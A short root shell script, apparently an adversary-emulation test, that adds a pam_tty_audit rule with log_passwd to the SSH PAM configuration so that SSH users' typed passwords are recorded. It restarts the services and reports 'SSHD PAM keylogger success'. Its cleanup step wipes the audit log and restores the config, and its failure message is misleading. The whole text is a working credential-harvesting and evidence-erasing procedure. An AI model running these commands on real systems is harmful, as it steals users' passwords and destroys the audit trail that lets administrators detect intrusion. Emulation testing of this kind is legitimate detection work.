Elevation Required;
#command
cp -v /etc/pam.d/sshd /tmp/
echo "session required pam_tty_audit.so disable=* enable=* open_only log_passwd" >> /etc/pam.d/sshd
systemctl restart sshd
systemctl restart auditd
#check
add="session required pam_tty_audit.so disable=* enable=* open_only log_passwd"
result=$(cat /etc/pam.d/sshd | tail -n 1)
echo "/etc/pam.d/sshd:"
echo $(cat /etc/pam.d/sshd | tail -n 5)
if [ "$result" = "$add" ];then echo "SSHD PAM keylogger success";else echo "No such file or directory";fi;
#cleanup
echo 0>/var/log/audit/audit.log
cp -fv /tmp/sshd /etc/pam.d/